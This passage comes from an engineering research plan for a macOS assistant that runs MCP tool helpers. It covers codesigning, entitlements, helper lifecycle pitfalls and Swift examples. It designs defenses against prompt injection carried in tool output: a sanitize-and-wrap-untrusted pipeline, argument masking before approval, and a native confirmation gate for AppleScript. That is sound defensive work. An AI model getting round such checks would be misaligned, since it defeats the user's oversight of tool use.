- **Using `--deep` in codesign** — re-signs nested bundles with parent identity, stripping per-helper entitlements. `mcp-applescript` would silently lose `automation.apple-events` and every script would return AppleEvent error `-1743` without TCC being actually denied. **Already lint-enforced by `scripts/verify-codesign-settings.sh`.**
- **Xcode "Code Sign On Copy" on nested helpers** — identical effect to `--deep`. **Already lint-enforced** (`scripts/verify-codesign-settings.sh` greps for `CodeSignOnCopy = YES` in pbxproj).
- **Webview modal for `run_applescript` confirmation** — forgeable by tool-output XSS on raw React render, parks MainActor. Lint must forbid `runModal`, `beginModalSession`, `NSApplication.run` across EVERY `@MainActor` presentation path, not only in `ConfirmationPresenter` (AUDIT-R4-Sec4 regression widening).
- **Sanitize ordering drift** — running `headTruncate` before `sanitize` leaks invalid UTF-8 into the head; running `wrapUntrusted` before `headTruncate` wraps the truncation marker in an untrusted tag where the nonce protection no longer applies. **Lock the order in `SanitizeForModel.prepare(...)` as the ONLY call site for the pipeline; forbid direct use of `wrapUntrusted` anywhere else.**
- **Serializing raw `ToolCallStart.args` to the webview before approval** — leaks pre-approval args. For `requiresConfirmation` tools, serialize as `{awaitingApproval: true}` until after the broker resolves with `.approve`. The full arg blob goes to replay log + `ConfirmationPresenter` (native AppKit) only.
- **Letting `mcp-time` or `mcp-clipboard` hold `automation.apple-events`** — cross-helper entitlement drift. `scripts/verify-entitlements.sh --post-codesign` already greps per-helper and fails if any helper other than `mcp-applescript` carries the key.
- **`.reconfiguring` MCP client during a tool call** — helper restarts must be LAZY on next `callTool`, not eager on EOF. Eager restart spawns a new helper for a dead request that will never resume, wasting TCC prompts and FD budget.
- **Inheriting parent env into helpers** — `process.environment = ProcessInfo.processInfo.environment` leaks API keys, PATH, HOME, shell fingerprints. Set `["PATH": "/usr/bin:/bin"]` explicitly.
- **Helper logging to stdout** — stdout is the JSON-RPC transport. Helper logs must go to stderr; parent `startStderrPump` forwards them to the main app's log channel.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| JSON-RPC 2.0 framing over stdio | Custom NDJSON line reader + dispatcher + id map + init handshake | `modelcontextprotocol/swift-sdk v0.12.0` `Client` + `StdioTransport` | ~400 LOC of framing + continuation map + init timeout we'd otherwise write. SDK is 2026-official, source-verified to match our deployment target. |
| Tool schema → Anthropic/Ollama tool format | Custom JSON schema serializer | SDK's `Tool` type + provider-side adapter | `Tool` already matches the MCP wire format; only provider-specific translation lives in `AnthropicProvider.toolsToMessagesAPI()` |
| Pending-request continuation map | `var pending: [UUID: CheckedContinuation<Response, Error>]` on our actor | SDK `Client` internal map + `disconnect()` drains | SDK's `Client.disconnect()` resumes every pending request with `.internalError("Client disconnected")` — we adapt to `MCPError.serverCrashed` at our boundary, but the drain logic is in the SDK |
| Codesign deepest-first walker | bash `for` loop, manual path walking | `scripts/codesign.sh` (already landed in P1-05) | Already uses `find -depth -name "*.app" -type d` with per-helper `.entitlements` grep; already refuses `--deep`. Phase 5 only needs to populate helpers under `Contents/Helpers/`, the walker handles the rest. |
| Per-helper entitlement verification | Custom XML parser | `scripts/verify-entitlements.sh --post-codesign` (already landed in P1-05) | Already greps signed entitlements per helper via `codesign -d --entitlements - --xml`; strips XML comments to defeat self-invalidating-grep footgun; enforces "only `mcp-applescript` may hold `automation.apple-events`" |
| AppleScript execution | Spawn `/usr/bin/osascript` subprocess | `NSAppleScript(source:).executeAndReturnError(_:)` in-process | `NSAppleScript` keeps execution inside the helper's own TCC identity; `osascript` forks a child with mixed identity |
| Control-character regex | Regex over `\p{Cc}` | `scalar.value < 0x20` comparison in `filter` | Regex engines disagree on bidi/zero-width coverage; explicit scalar-range filter is both faster and auditable |
| Retry/restart orchestration | Custom retry loop + backoff | Per-server restart mutex (in-flight `Task<Void, Error>?` slot) | Matches 2026 MCP spec lifecycle (spawn → initialize → reset_server → degraded) [CITED: ARCHITECTURE.md §4 per-server child-process actor pattern]; concurrent callers share one restart |

**Key insight:** Phase 5 is 60% glue, 40% discipline. The SDK owns the protocol bytes. P1-05 already owns the codesign+entitlement discipline. What Phase 5 contributes is: the spawn-and-wire glue, the ChildSpawnGate, the sanitize pipeline, the ConfirmationBroker FSM, and the three helper executables. Everything else is plumbed in.

## Runtime State Inventory

This phase is greenfield code addition (not a rename/refactor), so the standard RSI categories mostly don't apply. One near-miss worth documenting:

| Category | Items Found | Action Required |
|----------|-------------|------------------|
| Stored data | None — phase adds new code, no data migration | — |
| Live service config | None — phase has no external service dependency | — |
| OS-registered state | **TCC prompts on first use for `mcp-applescript`** — user will see "mcp-applescript wants to control {target app}" on first AppleScript execution. This is the correct per-helper identity prompt. On subsequent reinstall/re-sign with a different identity, TCC may reset the grant. | Plan must include a `JarvisAppTests`-level integration test that invokes a trivial AppleScript on first-launch and asserts the prompt surfaces correctly (manual-only on first run; re-runs post-grant automated). |
| Secrets/env vars | None — helpers inherit no env (`PATH=/usr/bin:/bin` only) | — |
| Build artifacts | **`mcp-servers/mcp-*/` add new xcodegen targets** — regenerating `project.yml` with helper targets alongside existing `Jarvis` target will change the pbxproj. The `Copy Helpers` `PBXCopyFilesBuildPhase` (empty in P1-01; dropped by xcodegen per P1-05 SUMMARY Deferred Items #2) must be rewired to copy `.app` products into `Contents/Helpers/`. | Plan must include: (a) helper targets declared in project.yml, (b) non-empty `copyFiles` entry on Jarvis target referencing each `<name>.app` product, (c) post-`xcodegen generate` verification that the Copy Files phase survives. |

## Common Pitfalls

### Pitfall 1: StdioTransport init doesn't spawn — parent code must

**What goes wrong:** Developer reads the SDK README, sees `StdioTransport()` + `client.connect(transport: transport)`, assumes the client auto-spawns a helper. In reality, `StdioTransport()` defaults to the CURRENT process's stdin/stdout (`FileDescriptor.standardInput` / `.standardOutput`). Without explicit FDs, a parent-side MCP Client tries to talk JSON-RPC over its own stdin/stdout, hangs forever.
**Why it happens:** The README's subprocess example (`let transport = StdioTransport(); try await client.connect(transport: transport)`) is written from the **helper's** perspective (the helper IS the subprocess, reading its own stdin/stdout). Nothing warns the reader that the parent-side spawn is the reader's responsibility.
**How to avoid:** In `MCPServerHandle.start()`, always construct `StdioTransport(input: childStdoutFD, output: childStdinFD, logger:)` with explicit `FileDescriptor` arguments derived from the child's pipes. Document in a code comment that the default no-arg init is for server-side (helper) use only.
**Warning signs:** `client.connect(transport:)` returns, but every `callTool` hangs forever with no error. Helper process appears running in Activity Monitor but no bytes on the pipe. [VERIFIED via StdioTransport.swift@0.12.0 lines 56-76 — defaults to `FileDescriptor.standardInput/Output`]

### Pitfall 2: `SWIFT_VERSION = "6.0"` project + SDK's `swift-tools-version:6.1`

**What goes wrong:** The SDK's Package.swift declares `// swift-tools-version:6.1`. Our project.yml sets `SWIFT_VERSION: "6.0"`. If Xcode picks the older toolchain, resolution fails with "package requires Swift tools version 6.1.0 or newer."
**Why it happens:** swift-tools-version is the version required to **parse** the SDK's Package.swift, not the Swift language version used to compile it. A Swift 6.1+ toolchain can compile Swift 6.0 targets just fine. Xcode 16+ ships with Swift 6.1; our project.yml's `SWIFT_VERSION: "6.0"` is a language mode setting, independent.
**How to avoid:** Plan must include a Wave 0 task that runs `swift --version` and confirms ≥ 6.1 on the build host. If < 6.1, bump the Xcode/toolchain requirement in `README.md` and `.mise.toml` (or equivalent).
**Warning signs:** `xcodebuild -resolvePackageDependencies` fails with "package requires Swift tools version 6.1.0 or newer" when adding the MCP package.

### Pitfall 3: Helper `Info.plist` missing `LSUIElement` / `LSBackgroundOnly`

**What goes wrong:** Helper `.app` bundles without `LSUIElement=YES` or `LSBackgroundOnly=YES` cause the helper process to appear in the Dock and Cmd-Tab list. On some macOS versions, the helper will try to present a main menu, UI, and event loop — none of which it has — and may stall on `NSApplication.shared`.
**Why it happens:** An `.app` bundle's Info.plist defaults to a foreground UI app unless explicitly told otherwise. The helper is a background process that runs under the main Jarvis.app's activation umbrella.
**How to avoid:** Every helper's `Info.plist` must include both `LSUIElement = true` and `LSBackgroundOnly = true`. Plan must include a pre-codesign Info.plist grep similar to how `verify-entitlements.sh` already asserts `LSUIElement` on the main app [VERIFIED: scripts/verify-entitlements.sh lines 63-74].
**Warning signs:** During a tool call, you briefly see the helper's name appear in the Cmd-Tab switcher. Or `Activity Monitor` shows the helper as a separate app, not a background process.

### Pitfall 4: Helper logs on stdout corrupt JSON-RPC stream

**What goes wrong:** A helper prints `print("tool called")` or logs via `Logger.debug(...)` where the logger is configured to stdout. The print statement lands mid-stream between JSON-RPC frames, breaks newline delimiting, and every subsequent message is parsed wrong. Parent sees `JSONDecodingError` and the stream dies.
**Why it happens:** stdio transport uses stdin/stdout for RPC. Helpers that log anywhere but stderr are corrupting their own transport.
**How to avoid:** (a) Configure all helper-side `Logger` instances to `stderr` explicitly via a custom `LogHandler`. (b) Lint rule: no bare `print(...)` in helper sources — require `logger.info(...)` through a stderr-routed logger. (c) Parent's `startStderrPump()` drains helper stderr into the main app's log channel.
**Warning signs:** First few tool calls work; some later call returns `JSONDecodingError` from the SDK client; parent restarts the helper, first call works again. Pattern = "works, then stops mid-session, restart fixes it."

### Pitfall 5: Process.terminate() doesn't kill the helper on stdin close

**What goes wrong:** On shutdown or crash detection, parent calls `process.terminate()` (SIGTERM). The helper ignores SIGTERM (no handler), the `Process.terminationHandler` never fires, parent's `handle.restartTask` never resolves, and subsequent callers block forever.
**Why it happens:** Swift Foundation's `Process.terminate()` sends SIGTERM but doesn't escalate. A helper without an explicit SIGTERM handler may not exit cleanly, especially mid-await in the SDK's own `waitUntilCompleted()`.
**How to avoid:** (a) Close the parent's write-end of stdin first (`try stdinPipe.fileHandleForWriting.close()`). The helper's `StdioTransport` sees EOF on stdin and exits naturally. (b) If the process is still alive after a 2s grace period, escalate with `kill(process.processIdentifier, SIGKILL)`. (c) Always set a `terminationHandler` before `run()` so restart plumbing always fires.
**Warning signs:** Parent reports "helper shutdown timeout"; `ps aux | grep mcp-` shows zombies.

### Pitfall 6: `automation.apple-events` entitlement is App-ID-scoped

**What goes wrong:** `mcp-applescript.entitlements` correctly carries `com.apple.security.automation.apple-events = true`, the codesign succeeds, but first AppleScript execution returns AppleEvent error `-1743` (`errAEEventNotPermitted`) with no TCC prompt.
**Why it happens:** The entitlement has TWO requirements: (a) the key must be in `.entitlements` at sign time, (b) the App ID (on developer.apple.com) must have the matching capability enabled. Developer ID Application certificate alone is insufficient — you need the App ID capability too. The same footgun hit `speech-recognition-assets` in P1-05 Task 4 (still BLOCKED awaiting human action).
**How to avoid:** Plan must include a pre-flight step: "Confirm on developer.apple.com → Identifiers → `com.koftwentytwo.jarvis.mcp-applescript` has the **Apple Events Sandbox Exception** (or equivalent Automation) capability enabled BEFORE Task N runs the first live AppleScript test." Surface this in the plan's User Setup Required section, same treatment P1-05 gave SpeechAnalyzer.
**Warning signs:** AppleEvent error `-1743` on first call with no TCC prompt; `sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db 'select * from access'` shows no row for `kTCCServiceAppleEvents` / `mcp-applescript`.

### Pitfall 7: Helper binary path in parent breaks when running from Xcode vs. archive

**What goes wrong:** Parent hardcodes helper path as `Bundle.main.bundleURL.appendingPathComponent("Contents/Helpers/mcp-time.app/Contents/MacOS/mcp-time")`. Works in `Release.xcarchive` cold-launch. Fails when Xcode runs the app from `DerivedData/.../Build/Products/Debug/Jarvis.app/...` because the `Copy Helpers` phase ran in a different order than expected and the helper isn't there yet.
**Why it happens:** xcodegen drops the empty `Copy Helpers` phase on regeneration (P1-05 SUMMARY Issues Encountered). The Debug build flow produces different artifact layouts than Archive.
**How to avoid:** (a) Always derive helper path from `Bundle.main.url(forAuxiliaryExecutable:)` OR walk `Bundle.main.bundleURL/Contents/Helpers/` at startup and register what's there (log warnings for missing). (b) Plan must include a startup smoke test that opens each registered helper and confirms init handshake succeeds before `systemReady` goes out. (c) Re-add the `Copy Helpers` `PBXCopyFilesBuildPhase` via project.yml's `copyFiles:` with a non-empty file list so xcodegen doesn't drop it (P1-05 deferred item #2).
**Warning signs:** `MCPClient.registerHelpers()` logs "helper mcp-time not found at expected path" during Debug runs only; Release archive works fine.

### Pitfall 8: `FD_CLOEXEC` sweep misses FDs opened between `prepare()` and `Process.run()`

**What goes wrong:** `ChildSpawnGate.prepare()` runs, walks `/dev/fd`, sets `FD_CLOEXEC` on everything. Then, before `process.run()` completes its fork+exec, another thread opens a file (e.g., the logger rotates and opens a new log file). That FD lacks `FD_CLOEXEC` and leaks into the helper.
**Why it happens:** `fork` is a snapshot — any FD open at fork-time without `FD_CLOEXEC` inherits. A sweep-before-fork has a race window.
**How to avoid:** Every FD **must be opened with `O_CLOEXEC` at creation time**. The `prepare()` sweep is belt-and-braces, not the primary defense. (a) SQLite connections: open with `SQLITE_OPEN_URI | SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE` and pass `vfs=unix-none` with `cloexec` (or manually set flag after open). (b) `open(..., O_CLOEXEC | ...)` for all Foundation `FileHandle`-alternative reads. (c) Debug assertion in `prepare()` that finds a non-CLOEXEC FD fatalErrors with the stack trace of the FD's origin.
**Warning signs:** `lsof -p <helper_pid>` shows inherited FDs (SQLite WAL, log files); eval harness "fd-leak" test fails.

## Code Examples

### Wiring a helper at startup

```swift
// Source: Pattern 1 above; composed from Context7 SDK docs + glacio.tech guide

let mcpClient = MCPClient()
let helpersRoot = Bundle.main.bundleURL.appendingPathComponent("Contents/Helpers")
let helpers: [(String, Bool)] = [
    ("mcp-time",        false),
    ("mcp-clipboard",   false),
    ("mcp-applescript", true),   // requiresConfirmation
]
for (name, requiresConfirmation) in helpers {
    let binaryURL = helpersRoot
        .appendingPathComponent("\(name).app")
        .appendingPathComponent("Contents/MacOS/\(name)")
    try await mcpClient.register(name: name, binaryURL: binaryURL, requiresConfirmation: requiresConfirmation)
}
```

### Orchestrator-side tool-call path (happy path + confirmation-required)

```swift
// Source: ARCHITECTURE.md data-flow diagram; plus MCP-04 + SEC-06/07

extension AgentOrchestrator {
    func dispatchToolCall(_ call: ToolCall, turnId: UUID, turnNonce: String) async throws -> LLMMessage {
        let requiresConfirmation = await mcpClient.toolMetadata(call.name)?.requiresConfirmation ?? false

        // MCP-04 / SEC-06: args masked to webview pre-approval for requiresConfirmation tools.
        let argsForHud: [String: Value] = requiresConfirmation ? ["awaitingApproval": .bool(true)] : call.arguments
        await bridge.send(.toolCallStart(id: call.id, name: call.name, args: argsForHud))

        if requiresConfirmation {
            // Native sheet; 60s timeout; barge-in routes through broker.response(.barge).
            let outcome = await confirmationBroker.request(
                id: call.id,
                toolName: call.name,
                argsPreview: SanitizeForModel.prepare(describe(call.arguments), capBytes: 2_048, turnNonce: turnNonce)
            )
            switch outcome {
            case .approve: break
            case .deny:     return .toolResult(id: call.id, content: "User denied tool call.", isError: true)
            case .timeout:  return .toolResult(id: call.id, content: "Confirmation timed out after 60s; tool call canceled.", isError: true)
            case .barge:    return .toolResult(id: call.id, content: "Tool call canceled by barge-in.", isError: true)
            }
        }

        let result: (content: [Tool.Content], isError: Bool)
        do {
            result = try await mcpClient.callTool(name: call.name, arguments: call.arguments)
        } catch let err as MCPError {
            return .toolResult(id: call.id, content: "MCP error: \(err.localizedDescription)", isError: true)
        }

        // SEC-07 fixed-order: sanitize → headTruncate → wrapUntrusted.
        let rawText = result.content.compactMap { content -> String? in
            if case let .text(text, _, _) = content { return text }
            return nil
        }.joined(separator: "\n")

        let forHistory = SanitizeForModel.prepare(rawText, capBytes: 8_192, turnNonce: turnNonce)
        let previewSlice = String(rawText.prefix(256))  // for .toolCallEnd HUD preview — pre-wrap, post-sanitize

        await bridge.send(.toolCallEnd(id: call.id, preview: previewSlice, isError: result.isError))
        replayLog.append(.toolCallResult(id: call.id, turnId: turnId, rawBytes: rawText, sanitizedBytes: forHistory))

        return .toolResult(id: call.id, content: forHistory, isError: result.isError)
    }
}
```

### Helper entitlement file (`mcp-applescript.entitlements`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- ONLY mcp-applescript may hold this entitlement.
         scripts/verify-entitlements.sh --post-codesign enforces this. -->
    <key>com.apple.security.automation.apple-events</key>
    <true/>
</dict>
</plist>
```

### Helper entitlement file (`mcp-time.entitlements` and `mcp-clipboard.entitlements`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Empty. Hardened Runtime is inherited from codesign.sh OTHER_CODE_SIGN_FLAGS.
         Neither helper needs any grant beyond Hardened Runtime baseline. -->
</dict>
</plist>
```

### Helper `Info.plist` (`mcp-time/Support/Info.plist`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.koftwentytwo.jarvis.mcp-time</string>
    <key>CFBundleName</key>
    <string>mcp-time</string>
    <key>CFBundleExecutable</key>
    <string>mcp-time</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0.0</string>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>LSUIElement</key>
    <true/>
    <key>LSBackgroundOnly</key>
    <true/>
    <key>LSMinimumSystemVersion</key>
    <string>13.0</string>
</dict>
</plist>
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Hand-rolled NDJSON JSON-RPC 2.0 (pre-P1 `IMPL-week-one.md §7`) | `modelcontextprotocol/swift-sdk v0.12.0` with `Client` + `StdioTransport` + `withMethodHandler` | SDK v0.12.0 shipped 2026-03-24; CLAUDE.md updated to supersede the hand-roll | Saves ~400 LOC; SDK handles init handshake, pending map, reconnection for HTTP transport. Phase 5 contributes only the parent-side subprocess wiring. |
| `Foundation.Process` + `Pipe` | **Still current** for parent-side spawn; `swift-subprocess` SF-0037 is pre-1.0 through 2026-04-20 | SF-0037 1.0 review window closes 2026-04-20 — not shipped at research time | No migration pressure for Phase 5. Use `Process` + `Pipe` + `FileDescriptor(rawValue:)` — standard recipe. |
| Qwen3 tool-calling in Ollama | Qwen 2.5-Coder 32B (baseline) | Ollama issues #14493, #14601, #14745, #15315 | No impact on Phase 5 (MCP is model-agnostic) — but OllamaProvider (P4) must stay pinned to qwen2.5-coder:32b |
| Global `--deep` codesign | Deepest-first walker with per-helper `.entitlements` | Technical Note TN2206 + R1-H-S3 | **Already landed in P1-05.** `scripts/codesign.sh` walks `Contents/Helpers/**/*.app` deepest-first; `scripts/verify-codesign-settings.sh` lints pbxproj for `--deep` presence. |
| Sheet `runModal` confirmation | Non-blocking sheet on hidden `NSPanel` via `beginSheet(_:completionHandler:)` | AUDIT-R3-S3; broadened in R4-Sec4 | `runModal` parks MainActor → breaks barge-in cancel and HUD state updates. Non-blocking sheet + FSM via AsyncChannel is the only correct pattern. |

**Deprecated/outdated:**
- **AppleScript-ObjC bridging (ASOC)** — still works but overkill for three one-off scripts. `NSAppleScript(source:)` is simpler.
- **Pre-macOS 12 `com.apple.security.temporary-exception.apple-events`** — obsolete; `com.apple.security.automation.apple-events` is the current entitlement.
- **Carbon `RegisterEventHotKey` for helper hotkeys** — helpers don't register global hotkeys (the main app does in P1-04); irrelevant here.

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | `mcp-applescript` first-call TCC prompt text will read something like "mcp-applescript wants to control {target app}" and show the helper's bundle name (not "Jarvis"). | Architectural Responsibility Map; Pitfall 6 | MEDIUM. If the prompt shows "Jarvis" instead, per-helper TCC identity isn't actually working even though codesign succeeds, and we'd need to investigate App ID provisioning. First live run on a machine with the right Developer ID + App ID capability will confirm. |
| A2 | ChildSpawnGate's `fdMax = getdtablesize()` sweep is cheap enough (~256 FDs on macOS by default) that we can run it before every spawn. | Pattern 3 ChildSpawnGate | LOW. If it's slow, we cache the result and only sweep at app start + on known FD-open events. |
| A3 | `Process.terminationHandler` is reliably called even when the helper exits via `exit(0)` in its own `waitUntilCompleted` path. | Pitfall 5 | LOW. Foundation's `Process` has been well-exercised for this; the handler fires for any exit path including signal delivery. |
| A4 | `NSAppleScript(source:).executeAndReturnError(_:)` is acceptable for v1 v.s. spawning `osascript` — in particular the return-as-string pathway via `result.stringValue` is sufficient for our "execute and return stdout" MCP contract. | Pattern 8 mcp-applescript | LOW. For complex return types (records, lists, byte arrays), we'd need `NSAppleEventDescriptor.data` or coercion. v1 scripts return strings. |
| A5 | The per-server restart mutex is 1-bounded — if restart itself fails, the error propagates and the helper is marked permanently degraded until next app restart. | Pattern 2 | MEDIUM. An alternative is N-bounded backoff retry. 1-bounded is simpler and matches PITFALLS #10 "lazy restart on next call" — the next call becomes the retry. |
| A6 | `StdioTransport` in the SDK handles partial reads and line-buffering correctly when the child writes multi-KB tool results in a single frame. | Pattern 1 | LOW. SDK source confirms `StdioTransport` reads into a buffer and delimits on `\n`; multi-KB results are fine. |
| A7 | `stdinPipe.fileHandleForWriting.close()` sending EOF to the child causes the child's `StdioTransport.connect()` read loop to see `read(2)` return 0, which propagates up as transport close, which the helper interprets as shutdown request. | Pitfall 5 | LOW. This is standard POSIX behavior; the SDK source's `readLoop` uses the standard EOF-on-zero-read pattern. |

## Open Questions

1. **Should `mcp-time` and `mcp-clipboard` also be `requiresConfirmation: true` for prompt-injection-corpus purposes?**
   - What we know: MCP-04 only requires confirmation for `run_applescript`. Clipboard and time are read-only and considered low-risk.
   - What's unclear: AUDIT-R1-H-Sec2 suggests ANY tool touching untrusted content (`get_clipboard` fits) could be a confirmation candidate depending on paranoia level.
   - Recommendation: Stay with the REQ-as-written (only `run_applescript` confirms). Log `get_clipboard` results prominently to DevOverlay so any weird clipboard content is visible.

2. **Should helper binary paths be resolved via `Bundle.main.url(forAuxiliaryExecutable:)` or manual walk?**
   - What we know: `forAuxiliaryExecutable` is designed for this exact pattern but expects a flat `Contents/MacOS/` layout, not nested `.app` bundles.
   - What's unclear: Whether `forAuxiliaryExecutable` resolves into nested `Contents/Helpers/<name>.app/Contents/MacOS/<name>` or only flat `Contents/MacOS/<name>` helpers.
   - Recommendation: Plan an early prototype task that tries both and picks the one that works. Manual walk of `Contents/Helpers/` is the fallback.

3. **Does `NSAppleScript` require the helper to be backed by an `NSApplication` event loop?**
   - What we know: `NSAppleScript` is AppKit. AppKit usually requires an event loop for async operations.
   - What's unclear: `NSAppleScript.executeAndReturnError(_:)` is synchronous and may work fine in a process without `NSApplication.shared.run()`, but some Apple events may pend.
   - Recommendation: Plan includes a scaffold-time probe in `mcp-applescript` main.swift that runs a trivial script (`tell application "System Events" to get the name of every process`) during helper init and logs the result. If it hangs or fails with `-600`, wrap the helper in a minimal `NSApplicationDelegate` + `NSApp.run()`.

4. **Should `ConfirmationPresenter` use SwiftUI-embedded AppKit NSPanel or pure AppKit NSPanel?**
   - What we know: Pure AppKit is the only surface that fully avoids webview-modal anti-pattern. SwiftUI sheets would technically work but most SwiftUI sheet APIs bottom out in `NSModalSession` which the lint rule bans.
   - What's unclear: Whether `.sheet` modifier on an AppKit NSPanel correctly avoids the banned modal path.
   - Recommendation: Use pure AppKit (`panel.beginSheet(confirmPanel, completionHandler:)`). Matches ARCHITECTURE.md ConfirmationBroker row explicitly.

5. **FD budget for helpers — can we keep all three helpers running continuously or should we spawn lazily per-call?**
   - What we know: ARCHITECTURE.md §Scaling says "lazy helper spawn — fine at 3 helpers pre-launched; past ~8 stretches cold-launch."
   - What's unclear: Whether cold-spawning every helper at app launch causes noticeable latency on first user turn.
   - Recommendation: Pre-launch all three at `applicationDidFinishLaunching`. Each handshake is ~50-100ms; aggregate ~300ms is within the startup barrier chain, not user-visible.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| Swift toolchain ≥ 6.1 (for `swift-tools-version:6.1` in SDK) | Building the MCP package | Unknown — verify at plan time | — | None; bump Xcode requirement |
| Xcode ≥ 16.0 | Swift 6.1 toolchain | Likely ✓ (P1-05 built with Xcode 16 implicitly) | — | — |
| `xcodegen` ≥ 2.40.0 | Regenerating pbxproj with helper targets | Unknown — verify | — | Hand-edit pbxproj (fragile) |
| macOS 13.0+ on dev machine | SDK platform requirement | ✓ (we run macOS 26 Tahoe) | — | — |
| Developer ID Application cert | Live-signing helpers for TCC identity | ✗ per P1-05 Task 4 | — | Debug ad-hoc `CODE_SIGN_IDENTITY: "-"` works for local testing; per-helper TCC identity works in ad-hoc too but prompt text differs |
| `com.koftwentytwo.jarvis.mcp-applescript` App ID with Apple Events capability | `mcp-applescript` first AppleScript call | ✗ Unknown — parallel to P1-05 SpeechAnalyzer App ID gap | — | None — AppleEvent `-1743` error until registered |
| Anthropic API access | Live tool-call round-trip test | Should be in Keychain from P1-02 | — | — |
| Ollama with `qwen2.5-coder:32b` | Local-path tool-call eval | User-supplied per CLAUDE.md | — | Stub test with Anthropic-only |

**Missing dependencies with no fallback:**
- Developer ID Application cert for live per-helper TCC identity verification (same blocker as P1-05 Task 4)
- App ID capability for `mcp-applescript` bundle identifier

**Missing dependencies with fallback:**
- None at Swift toolchain / xcodegen level (assume standard dev env, verify at plan time)

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | XCTest (bundled unit-test target pattern from P1-01 `JarvisAppTests`) |
| Config file | `project.yml` — new `MCPTests` target alongside `JarvisAppTests` |
| Quick run command | `xcodebuild test -scheme Jarvis -only-testing:MCPTests/SanitizeForModelTests -destination 'platform=macOS'` |
| Full suite command | `xcodebuild test -scheme Jarvis -destination 'platform=macOS'` |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| MCP-01 | Client uses `modelcontextprotocol/swift-sdk v0.12.0` | unit | `xcodebuild test -only-testing:MCPTests/MCPClientVersionTests/test_spm_resolves_swift_sdk_at_0_12_0` | ❌ Wave 0 |
| MCP-02 | `get_time` returns current time invocable by agent | integration | `xcodebuild test -only-testing:MCPTests/MCPTimeIntegrationTests/test_get_time_returns_iso_8601_string` | ❌ Wave 0 |
| MCP-03 | `get_clipboard` refuses pasteboards with `NSPasteboardTypeFileURL` | unit (pasteboard stubbed) | `xcodebuild test -only-testing:MCPTests/MCPClipboardTests/test_refuses_when_fileURL_type_present` | ❌ Wave 0 |
| MCP-04 | `run_applescript` gated behind native-AppKit sheet; args masked pre-approval | unit (broker mocked) + integration | `xcodebuild test -only-testing:MCPTests/ConfirmationBrokerTests` + `/MCPToolDispatchTests/test_args_masked_pre_approval` | ❌ Wave 0 |
| MCP-07 | Per-server restart mutex; 100 restart cycles no FD leaks | integration (crash-injected) | `xcodebuild test -only-testing:MCPTests/MCPRestartTests/test_100_crash_cycles_no_fd_leak` | ❌ Wave 0 |
| MCP-08 | Child processes spawn via single `ChildSpawnGate` with `FD_CLOEXEC` + minimal env | unit (FD inspected via `lsof` out-of-process OR `/dev/fd` walk from child) | `xcodebuild test -only-testing:MCPTests/ChildSpawnGateTests/test_spawned_child_env_equals_PATH_only` | ❌ Wave 0 |
| MCP-09 | ConfirmationBroker 4-state FSM; late transitions no-op | unit | `xcodebuild test -only-testing:MCPTests/ConfirmationBrokerTests/test_late_transitions_no_op` | ❌ Wave 0 |
| AGENT-11 | 60s confirmation timeout synthesizes deny | unit (time injected) | `xcodebuild test -only-testing:MCPTests/ConfirmationBrokerTests/test_60s_timeout_synthesizes_deny` | ❌ Wave 0 |
| SEC-07 | Sanitize pipeline fixed order; UTF-8 valid; strips C0 (except \t); strips bidi/zero-width; caps line length | unit | `xcodebuild test -only-testing:MCPTests/SanitizeForModelTests` | ❌ Wave 0 |
| MCP-06 (regression) | Post-build entitlement grep: only `mcp-applescript` carries `apple-events` | scaffold (already exists P1-05) | `./scripts/test-verify-entitlements.sh` | ✅ (P1-05) |

### Sampling Rate

- **Per task commit:** `xcodebuild test -scheme Jarvis -only-testing:MCPTests -destination 'platform=macOS'` (~30s for the MCP bundle)
- **Per wave merge:** Full `xcodebuild test -scheme Jarvis` + `scripts/test-verify-entitlements.sh`
- **Phase gate:** Full suite green + live end-to-end `get_time` round-trip via stubbed orchestrator + 100-cycle restart test + crash-injection FD-leak inspection before `/gsd-verify-work`

### Wave 0 Gaps

- [ ] `packages/MCP/Tests/MCPTests/SanitizeForModelTests.swift` — covers SEC-07 + injection-attempt corpus subset
- [ ] `packages/MCP/Tests/MCPTests/ConfirmationBrokerTests.swift` — covers MCP-09 + AGENT-11
- [ ] `packages/MCP/Tests/MCPTests/ChildSpawnGateTests.swift` — covers MCP-08
- [ ] `packages/MCP/Tests/MCPTests/MCPClientVersionTests.swift` — covers MCP-01 (static assert on SPM resolved version)
- [ ] `packages/MCP/Tests/MCPTests/MCPRestartTests.swift` — covers MCP-07 (crash injection via SIGKILL)
- [ ] `packages/MCP/Tests/MCPTests/MCPClipboardTests.swift` — covers MCP-03 (pasteboard type stubbing)
- [ ] `packages/MCP/Tests/MCPTests/MCPToolDispatchTests.swift` — covers MCP-04 args masking + end-to-end orchestrator dispatch
- [ ] `mcp-servers/mcp-time/Tests/MCPTimeIntegrationTests.swift` — covers MCP-02 (live stdin/stdout round-trip via `InMemoryTransport` or real subprocess)
- [ ] `MCPTests` target added to `project.yml` (mirrors `JarvisAppTests` structure)
- [ ] Framework install: none — XCTest ships with Xcode

## Security Domain

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
